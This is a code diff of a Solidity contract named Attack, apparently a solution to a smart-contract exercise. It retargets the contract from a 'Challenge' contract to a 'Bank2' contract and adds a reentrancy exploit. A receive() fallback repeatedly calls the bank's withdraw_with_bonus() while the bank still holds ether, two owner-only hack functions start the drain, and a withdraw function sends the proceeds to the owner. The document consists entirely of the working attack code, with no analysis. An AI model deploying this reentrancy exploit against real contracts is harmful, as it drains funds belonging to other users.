@@ -2,20 +2,35 @@
 pragma solidity ^0.8.0;
 
 import '@openzeppelin/contracts/access/Ownable.sol';
-import './Challenge.sol';
+import 'hardhat/console.sol';
+import './Bank2.sol';
 
 contract Attack is Ownable {
-    Challenge public challenge;
+    Bank2 public bank;
 
-    constructor(address challenge_) {
-        challenge = Challenge(challenge_);
+    constructor(address payable bank_) {
+        bank = Bank2(bank_);
     }
 
-    fallback() external {
-        challenge.lock_me();
+    receive() external payable {
+        if (address(bank).balance > 0) {
+            bank.withdraw_with_bonus();
+        }
     }
 
-    function hack(address me_) external onlyOwner {
-        challenge.exploit_me(me_);
+    function withdraw() external onlyOwner {
+        payable(owner()).transfer(address(this).balance);
+    }
+
+    function hack1() external payable onlyOwner {
+        (bool success, ) = address(bank).call{value: msg.value, gas: 10000000 }("");
+        if (!success) {
+            revert();
+        }
+    }
+
+    function hack2() external payable onlyOwner {
+        bank.giveBonusToUser{value: msg.value}(address(this));
+        bank.withdraw_with_bonus();
     }
 }
